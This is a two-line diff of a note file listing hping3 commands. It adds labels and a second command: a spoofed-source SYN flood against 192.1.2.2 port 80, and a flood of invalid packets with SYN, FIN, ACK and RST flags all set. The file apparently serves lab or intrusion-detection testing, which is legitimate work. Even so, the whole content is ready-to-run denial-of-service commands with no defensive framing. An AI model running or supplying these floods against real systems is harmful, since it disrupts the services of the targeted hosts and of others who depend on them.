@@ -1,1 +1,2 @@
-hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.1.2.2
+hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.1.2.2 - SYN FLOOD
+hping3 -c 15000 -d 120 -S -F -A -R -w 64 -p 80 --flood --rand-source 192.1.2.2 - INVALID PACKET
